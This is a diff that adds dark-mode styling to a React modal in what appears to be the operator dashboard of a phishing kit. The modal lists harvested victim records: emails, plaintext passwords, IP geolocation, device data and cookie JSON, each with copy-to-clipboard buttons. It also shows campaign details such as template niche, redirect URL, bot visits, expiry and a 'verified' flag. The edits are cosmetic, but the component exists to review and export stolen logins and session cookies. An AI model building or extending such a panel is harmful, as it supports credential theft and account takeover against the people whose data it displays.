@@ -153,13 +153,13 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
   // Render detailed view for a specific response
   const renderDetailedView = (response: ResponseData) => {
     return (
-      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
-        <div className="bg-white rounded-lg p-6 w-full max-w-4xl max-h-[90vh] overflow-auto">
+      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 dark:bg-opacity-75">
+        <div className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-4xl max-h-[90vh] overflow-auto">
           <div className="flex justify-between items-center mb-4">
-            <h2 className="text-xl font-bold">Response Details</h2>
+            <h2 className="text-xl font-bold text-gray-900 dark:text-white">Response Details</h2>
             <button 
               onClick={() => setDetailedResponseIndex(null)} 
-              className="text-gray-500 hover:text-gray-700"
+              className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200"
             >
               Back to List
             </button>
@@ -168,27 +168,27 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
           <div className="space-y-4">
             <div className="grid md:grid-cols-2 gap-4">
               <div>
-                <h3 className="font-semibold mb-2">Basic Information</h3>
-                <div className="bg-gray-50 p-3 rounded space-y-2">
+                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Basic Information</h3>
+                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded space-y-2">
                   <div>
-                    <span className="font-medium text-gray-600">Email:</span>
-                    <span className="ml-2">{response.email}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Email:</span>
+                    <span className="ml-2 dark:text-gray-200">{response.email}</span>
                   </div>
                   <div>
-                    <span className="font-medium text-gray-600">Password:</span>
-                    <span className="ml-2">{response.password}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Password:</span>
+                    <span className="ml-2 dark:text-gray-200">{response.password}</span>
                   </div>
                   <div>
-                    <span className="font-medium text-gray-600">Domain:</span>
-                    <span className="ml-2">{response.domain}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Domain:</span>
+                    <span className="ml-2 dark:text-gray-200">{response.domain}</span>
                   </div>
                   <div>
-                    <span className="font-medium text-gray-600">Timestamp:</span>
-                    <span className="ml-2">{new Date(response.timestamp).toLocaleString()}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Timestamp:</span>
+                    <span className="ml-2 dark:text-gray-200">{new Date(response.timestamp).toLocaleString()}</span>
                   </div>
                   <div>
-                    <span className="font-medium text-gray-600">Verified:</span>
-                    <span className={`ml-2 ${response.verified ? 'text-green-600' : 'text-red-600'}`}>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Verified:</span>
+                    <span className={`ml-2 ${response.verified ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'}`}>
                       {response.verified ? 'Yes' : 'No'}
                     </span>
                   </div>
@@ -196,31 +196,31 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
               </div>
 
               <div>
-                <h3 className="font-semibold mb-2">Project Information</h3>
-                <div className="bg-gray-50 p-3 rounded space-y-2">
+                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Project Information</h3>
+                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded space-y-2">
                   <div>
-                    <span className="font-medium text-gray-600">Category:</span>
-                    <span className="ml-2">{response.category}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Category:</span>
+                    <span className="ml-2 dark:text-gray-200">{response.category}</span>
                   </div>
                   <div>
-                    <span className="font-medium text-gray-600">Type:</span>
-                    <span className="ml-2">{response.type}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Type:</span>
+                    <span className="ml-2 dark:text-gray-200">{response.type}</span>
                   </div>
                   <div>
-                    <span className="font-medium text-gray-600">Title:</span>
-                    <span className="ml-2">{response.title}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300">Title:</span>
+                    <span className="ml-2 dark:text-gray-200">{response.title}</span>
                   </div>
                 </div>
               </div>
             </div>
 
             <div>
-              <h3 className="font-semibold mb-2">IP Data</h3>
-              <div className="bg-gray-50 p-3 rounded grid md:grid-cols-2 gap-2">
+              <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">IP Data</h3>
+              <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded grid md:grid-cols-2 gap-2">
                 {Object.entries(response.ipData).map(([key, value]) => (
                   <div key={key}>
-                    <span className="font-medium text-gray-600 capitalize">{key}:</span>
-                    <span className="ml-2">{String(value)}</span>
+                    <span className="font-medium text-gray-600 dark:text-gray-300 capitalize">{key}:</span>
+                    <span className="ml-2 dark:text-gray-200">{String(value)}</span>
                   </div>
                 ))}
               </div>
@@ -228,12 +228,12 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
 
             {response.deviceData && (
               <div>
-                <h3 className="font-semibold mb-2">Device Data</h3>
-                <div className="bg-gray-50 p-3 rounded grid md:grid-cols-2 gap-2">
+                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Device Data</h3>
+                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded grid md:grid-cols-2 gap-2">
                   {Object.entries(response.deviceData).map(([key, value]) => (
                     <div key={key}>
-                      <span className="font-medium text-gray-600 capitalize">{key}:</span>
-                      <span className="ml-2">{String(value)}</span>
+                      <span className="font-medium text-gray-600 dark:text-gray-300 capitalize">{key}:</span>
+                      <span className="ml-2 dark:text-gray-200">{String(value)}</span>
                     </div>
                   ))}
                 </div>
@@ -242,14 +242,14 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
 
             {response.cookieJSON && (
               <div>
-                <h3 className="font-semibold mb-2">Cookie JSON</h3>
-                <div className="bg-gray-50 p-3 rounded overflow-auto">
-                  <pre className="text-xs">{JSON.stringify(response.cookieJSON, null, 2)}</pre>
+                <h3 className="font-semibold mb-2 text-gray-900 dark:text-white">Cookie JSON</h3>
+                <div className="bg-gray-50 dark:bg-gray-700 p-3 rounded overflow-auto">
+                  <pre className="text-xs dark:text-gray-200">{JSON.stringify(response.cookieJSON, null, 2)}</pre>
                   <div className="mt-2 flex justify-end">
                     <FontAwesomeIcon 
                       icon={faCopy} 
                       onClick={() => copyToClipboard(JSON.stringify(response.cookieJSON), 'Cookie JSON copied')} 
-                      className="cursor-pointer hover:text-blue-500" 
+                      className="cursor-pointer hover:text-blue-500 dark:hover:text-blue-300" 
                       title="Copy Cookie JSON" 
                     />
                   </div>
@@ -270,7 +270,7 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
   }
 
   return (
-    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50">
+    <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50 dark:bg-opacity-75">
       {/* Project Settings Modal */}
       {showSettingsModal && selectedProject && (
         <ProjectSettingsModal
@@ -278,48 +278,48 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
           onClose={() => setShowSettingsModal(false)}
         />
       )}
-      <div className="bg-white rounded-lg p-6 w-full max-w-4xl max-h-[90vh] overflow-auto">
-        <div className="bg-gradient-to-r from-blue-50 to-blue-100 p-4 rounded-lg mb-4 shadow-sm">
+      <div className="bg-white dark:bg-gray-800 rounded-lg p-6 w-full max-w-4xl max-h-[90vh] overflow-auto">
+        <div className="bg-gradient-to-r from-blue-50 to-blue-100 dark:from-blue-900 dark:to-blue-800 p-4 rounded-lg mb-4 shadow-sm dark:shadow-none">
           <div className="flex justify-between items-center mb-2">
             <div>
-              <h2 className="text-2xl font-bold text-gray-800 flex items-center">
+              <h2 className="text-2xl font-bold text-gray-800 dark:text-white flex items-center">
                 {selectedProject.projectTitle}
               </h2>
-              <p className="text-sm text-gray-600">{selectedProject.templateNiche} - {selectedProject.templateType}</p>
+              <p className="text-sm text-gray-600 dark:text-gray-300">{selectedProject.templateNiche} - {selectedProject.templateType}</p>
               {/* URLs Section */}
               <div className="flex flex-wrap gap-4 mt-2">
                 {selectedProject.pageURL && (
-                  <span className="flex items-center text-xs bg-blue-50 px-2 py-1 rounded">
+                  <span className="flex items-center text-xs bg-blue-50 dark:bg-blue-900 px-2 py-1 rounded dark:text-blue-200">
                     <span className="font-semibold mr-1">Page URL:</span>
                     <span className="mr-1 truncate max-w-[160px]" title={selectedProject.pageURL}>{selectedProject.pageURL}</span>
                     <FontAwesomeIcon
                       icon={faCopy}
                       onClick={() => copyToClipboard(selectedProject.pageURL || '', 'Page URL copied')}
-                      className="ml-1 text-gray-500 cursor-pointer hover:text-blue-600"
+                      className="ml-1 text-gray-500 dark:text-gray-400 cursor-pointer hover:text-blue-600 dark:hover:text-blue-300"
                       title="Copy Page URL"
                     />
                   </span>
                 )}
                 {selectedProject.domainURL && (
-                  <span className="flex items-center text-xs bg-green-50 px-2 py-1 rounded">
+                  <span className="flex items-center text-xs bg-green-50 dark:bg-green-900 px-2 py-1 rounded dark:text-green-200">
                     <span className="font-semibold mr-1">Domain URL:</span>
                     <span className="mr-1 truncate max-w-[160px]" title={selectedProject.domainURL}>{selectedProject.domainURL}</span>
                     <FontAwesomeIcon
                       icon={faCopy}
                       onClick={() => copyToClipboard(selectedProject.domainURL || '', 'Domain URL copied')}
-                      className="ml-1 text-gray-500 cursor-pointer hover:text-green-600"
+                      className="ml-1 text-gray-500 dark:text-gray-400 cursor-pointer hover:text-green-600 dark:hover:text-green-300"
                       title="Copy Domain URL"
                     />
                   </span>
                 )}
                 {selectedProject.redirectURL && (
-                  <span className="flex items-center text-xs bg-yellow-50 px-2 py-1 rounded">
+                  <span className="flex items-center text-xs bg-yellow-50 dark:bg-yellow-900 px-2 py-1 rounded dark:text-yellow-200">
                     <span className="font-semibold mr-1">Redirect URL:</span>
                     <span className="mr-1 truncate max-w-[160px]" title={selectedProject.redirectURL}>{selectedProject.redirectURL}</span>
                     <FontAwesomeIcon
                       icon={faCopy}
                       onClick={() => copyToClipboard(selectedProject.redirectURL || '', 'Redirect URL copied')}
-                      className="ml-1 text-gray-500 cursor-pointer hover:text-yellow-600"
+                      className="ml-1 text-gray-500 dark:text-gray-400 cursor-pointer hover:text-yellow-600 dark:hover:text-yellow-300"
                       title="Copy Redirect URL"
                     />
                   </span>
@@ -328,7 +328,7 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
             </div>
             <div className="flex items-center space-x-2">
               <button
-                className="text-gray-500 hover:text-blue-600 bg-white rounded-full p-2 shadow-sm"
+                className="text-gray-500 dark:text-gray-400 hover:text-blue-600 dark:hover:text-blue-300 bg-white dark:bg-gray-700 rounded-full p-2 shadow-sm dark:shadow-none"
                 title="Settings"
                 onClick={() => setShowSettingsModal(true)}
               >
@@ -336,7 +336,7 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
               </button>
               <button 
                 onClick={onClose} 
-                className="text-gray-500 hover:text-gray-700 bg-white rounded-full p-2 shadow-sm"
+                className="text-gray-500 dark:text-gray-400 hover:text-gray-700 dark:hover:text-gray-200 bg-white dark:bg-gray-700 rounded-full p-2 shadow-sm dark:shadow-none"
               >
                 Close
               </button>
@@ -344,36 +344,36 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
           </div>
           <div className="mt-2 grid grid-cols-2 md:grid-cols-4 gap-2 text-sm">
             <div>
-              <span className="font-semibold text-gray-700">Page Health:</span> 
+              <span className="font-semibold text-gray-700 dark:text-gray-300">Page Health:</span> 
               <span className={`
-                ${selectedProject.pageHealth === 'healthy' ? 'text-green-600' : 'text-red-600'}
+                ${selectedProject.pageHealth === 'healthy' ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'}
               `}>
                 {selectedProject.pageHealth}
               </span>
             </div>
             <div>
-              <span className="font-semibold text-gray-700">Page Visits:</span> {selectedProject.pageVisits}
+              <span className="font-semibold text-gray-700 dark:text-gray-300">Page Visits:</span> <span className="dark:text-gray-200">{selectedProject.pageVisits}</span>
             </div>
             <div>
-              <span className="font-semibold text-gray-700">Bot Visits:</span> {selectedProject.botVisits}
+              <span className="font-semibold text-gray-700 dark:text-gray-300">Bot Visits:</span> <span className="dark:text-gray-200">{selectedProject.botVisits}</span>
             </div>
             <div>
-              <span className="font-semibold text-gray-700">Expiry Date:</span> {new Date(selectedProject.expiryDate).toLocaleDateString()}
+              <span className="font-semibold text-gray-700 dark:text-gray-300">Expiry Date:</span> <span className="dark:text-gray-200">{new Date(selectedProject.expiryDate).toLocaleDateString()}</span>
             </div>
             <div>
-              <span className="font-semibold text-gray-700">Total Responses:</span> {selectedProject.responseCount}
+              <span className="font-semibold text-gray-700 dark:text-gray-300">Total Responses:</span> <span className="dark:text-gray-200">{selectedProject.responseCount}</span>
             </div>
             <div>
-              <span className="font-semibold text-gray-700">System Status:</span> 
+              <span className="font-semibold text-gray-700 dark:text-gray-300">System Status:</span> 
               <span className={`
-                ${selectedProject.systemStatus === 'active' ? 'text-green-600' : 'text-red-600'}
+                ${selectedProject.systemStatus === 'active' ? 'text-green-600 dark:text-green-400' : 'text-red-600 dark:text-red-400'}
               `}>
                 {selectedProject.systemStatus}
               </span>
             </div>
           </div>
         </div>
-        <div className="text-sm text-gray-600 mb-4 px-4">
+        <div className="text-sm text-gray-600 dark:text-gray-300 mb-4 px-4">
           Showing {parsedResponses.length} responses
         </div>
 
@@ -381,26 +381,26 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
         <div className="hidden md:block">
           <table className="w-full">
             <thead>
-              <tr className="bg-gray-100">
-                <th className="p-2 text-left">Email</th>
-                <th className="p-2 text-left">Password</th>
-                <th className="p-2 text-left">IP</th>
-                <th className="p-2 text-left">Actions</th>
+              <tr className="bg-gray-100 dark:bg-gray-700">
+                <th className="p-2 text-left text-gray-900 dark:text-gray-200">Email</th>
+                <th className="p-2 text-left text-gray-900 dark:text-gray-200">Password</th>
+                <th className="p-2 text-left text-gray-900 dark:text-gray-200">IP</th>
+                <th className="p-2 text-left text-gray-900 dark:text-gray-200">Actions</th>
               </tr>
             </thead>
             <tbody>
               {parsedResponses.map((response, index) => (
                 <tr 
                   key={index} 
-                  className={`border-b cursor-pointer ${response.verified ? 'bg-green-50 hover:bg-green-100' : 'bg-red-50 hover:bg-red-100'}`}
+                  className={`border-b dark:border-gray-700 cursor-pointer ${response.verified ? 'bg-green-50 hover:bg-green-100 dark:bg-green-900 dark:hover:bg-green-800' : 'bg-red-50 hover:bg-red-100 dark:bg-red-900 dark:hover:bg-red-800'}`}
                   onClick={() => setDetailedResponseIndex(index)}
                 >
-                  <td className="p-2">{response.email}</td>
-                  <td className="p-2">{response.password}</td>
-                  <td className="p-2">
+                  <td className="p-2 text-gray-900 dark:text-gray-200">{response.email}</td>
+                  <td className="p-2 text-gray-900 dark:text-gray-200">{response.password}</td>
+                  <td className="p-2 text-gray-900 dark:text-gray-200">
                     <div>
                       <span>{response.ipData.ip}</span>
-                      <p className="text-xs text-gray-500">{response.ipData.city}, {response.ipData.country}</p>
+                      <p className="text-xs text-gray-500 dark:text-gray-400">{response.ipData.city}, {response.ipData.country}</p>
                     </div>
                   </td>
                   <td className="p-2 flex space-x-2">
@@ -410,7 +410,7 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
                         e.stopPropagation();
                         copyToClipboard(JSON.stringify(response.ipData), 'IP Data copied');
                       }} 
-                      className="cursor-pointer hover:text-blue-500" 
+                      className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-blue-500 dark:hover:text-blue-300" 
                       title="Copy IP Data" 
                     />
                     <FontAwesomeIcon 
@@ -419,7 +419,7 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
                         e.stopPropagation();
                         copyToClipboard(JSON.stringify(response.deviceData || {}), 'Device Data copied');
                       }} 
-                      className="cursor-pointer hover:text-green-500" 
+                      className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-green-500 dark:hover:text-green-300" 
                       title="Copy Device Data" 
                     />
                     {response.cookieJSON && (
@@ -429,13 +429,13 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
                           e.stopPropagation();
                           response.cookieJSON && copyToClipboard(response.cookieJSON, 'Cookie JSON copied');
                         }} 
-                        className="cursor-pointer hover:text-purple-500" 
+                        className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-purple-500 dark:hover:text-purple-300" 
                         title="Copy Cookie JSON" 
                       />
                     )}
                     <FontAwesomeIcon 
                       icon={faChevronRight} 
-                      className="text-gray-500" 
+                      className="text-gray-500 dark:text-gray-400" 
                     />
                   </td>
                 </tr>
@@ -449,20 +449,20 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
           {parsedResponses.slice(0, 5).map((response, index) => (
             <div 
               key={index} 
-              className={`rounded-lg p-3 mb-2 ${response.verified ? 'bg-green-100' : 'bg-red-100'}`}
+              className={`rounded-lg p-3 mb-2 ${response.verified ? 'bg-green-100 dark:bg-green-900' : 'bg-red-100 dark:bg-red-900'}`}
               onClick={() => setDetailedResponseIndex(index)}
             >
               <div className="flex justify-between items-center mb-2">
                 <div>
-                  <p className="font-bold">Email: {response.email}</p>
-                  <p className="text-sm text-gray-600">Password: {response.password}</p>
+                  <p className="font-bold text-gray-900 dark:text-white">Email: {response.email}</p>
+                  <p className="text-sm text-gray-600 dark:text-gray-300">Password: {response.password}</p>
                 </div>
-                <FontAwesomeIcon icon={faChevronRight} className="text-blue-500" />
+                <FontAwesomeIcon icon={faChevronRight} className="text-blue-500 dark:text-blue-400" />
               </div>
               <div className="flex justify-between items-center">
                 <div>
-                  <p className="text-sm">IP: {response.ipData.ip}</p>
-                  <p className="text-xs text-gray-500">{response.ipData.city}, {response.ipData.country}</p>
+                  <p className="text-sm text-gray-900 dark:text-gray-200">IP: {response.ipData.ip}</p>
+                  <p className="text-xs text-gray-500 dark:text-gray-400">{response.ipData.city}, {response.ipData.country}</p>
                 </div>
                 <div className="flex items-center space-x-2">
                   <FontAwesomeIcon 
@@ -471,7 +471,7 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
                       e.stopPropagation();
                       copyToClipboard(JSON.stringify(response.ipData), 'IP Data copied');
                     }} 
-                    className="cursor-pointer hover:text-blue-500" 
+                    className="cursor-pointer text-gray-500 dark:text-gray-400 hover:text-blue-500 dark:hover:text-blue-300" 
                     title="Copy IP Data" 
                   />
                 </div>
@@ -479,7 +479,7 @@ export default function ResponseModal({ selectedProject, onClose }: ResponseModa
             </div>
           ))}
           {parsedResponses.length > 5 && (
-            <div className="text-center text-gray-500 mt-2">
+            <div className="text-center text-gray-500 dark:text-gray-400 mt-2">
               {parsedResponses.length - 5} more responses
             </div>
           )}
